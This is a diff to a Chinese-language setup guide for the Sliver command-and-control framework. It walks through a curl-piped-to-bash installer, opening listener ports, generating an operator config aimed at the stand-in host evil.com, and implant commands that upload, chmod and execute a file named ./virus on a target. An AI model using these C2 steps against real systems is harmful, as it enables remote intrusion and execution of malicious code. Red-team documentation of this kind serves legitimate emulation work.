@@ -5,7 +5,7 @@ Adversary Emulation Framework.
 安装
 
 ```
-┌──(sec@debian)-[~]
+┌──(nemo@debian)-[~]
 └─$ curl -fsSL https://github.com/jadensalas469466/script/raw/main/sliver_install.sh | bash
 ```
 
@@ -18,14 +18,14 @@ Adversary Emulation Framework.
 开机自启
 
 ```
-┌──(sec@debian)-[~]
+┌──(nemo@debian)-[~]
 └─$ sudo systemctl enable --now sliver.service
 ```
 
 进入 Server
 
 ```
-┌──(sec@debian)-[~]
+┌──(nemo@debian)-[~]
 └─$ sliver-server
 ```
 
@@ -40,14 +40,14 @@ Adversary Emulation Framework.
 开启 `31337` 端口
 
 ```
-┌──(sec@debian)-[~]
+┌──(nemo@debian)-[~]
 └─$ sudo ufw allow 31337
 ```
 
 生成 Client 配置
 
 ```
-[server] sliver > new-operator -n sec -l evil.com -p 31337
+[server] sliver > new-operator -n nemo -l evil.com -p 31337
 ```
 
 开启多端控制
@@ -67,7 +67,7 @@ Adversary Emulation Framework.
 开启 `65135` 端口
 
 ```
-┌──(sec@debian)-[~]
+┌──(nemo@debian)-[~]
 └─$ sudo ufw allow 65135
 ```
 
@@ -105,6 +105,30 @@ Adversary Emulation Framework.
 [server] sliver > use  685a7144
 ```
 
+断开会话
+
+```
+[server] sliver (implant) > close
+```
+
+上传本地文件到目标
+
+```
+[server] sliver (implant) > upload ./virus ./path
+```
+
+添加执行权限
+
+```
+[server] sliver (implant) > chmod ./virus 755
+```
+
+执行程序
+
+```
+[server] sliver (implant) > execute ./virus
+```
+
 ### 2.2. Client
 
 > 用于在 Client 控制与 Server 建立连接的 Implant
@@ -112,14 +136,14 @@ Adversary Emulation Framework.
 导入 Client 配置文件
 
 ```
-┌──(sec@debian)-[~]
-└─$ sliver-client import ~/.sliver-client/configs/nemo_evil.com.cfg
+┌──(nemo@debian)-[~]
+└─$ sliver-client import ~/.sliver-client/nemo_evil.com.cfg
 ```
 
 运行 Client
 
 ```
-┌──(sec@debian)-[~]
+┌──(nemo@debian)-[~]
 └─$ sliver-client
 ```
 
@@ -133,32 +157,6 @@ Adversary Emulation Framework.
 
 ```
 sliver > exit
-```
-
-### 2.3. Implant
-
-断开会话
-
-```
-[server] sliver (implant) > close
-```
-
-上传本地文件到目标
-
-```
-[server] sliver (implant) > upload ./evil ./example
-```
-
-添加执行权限
-
-```
-[server] sliver (implant) > chmod ./example 755
-```
-
-执行程序
-
-```
-[server] sliver (implant) > execute ./example
 ```
 
 ---
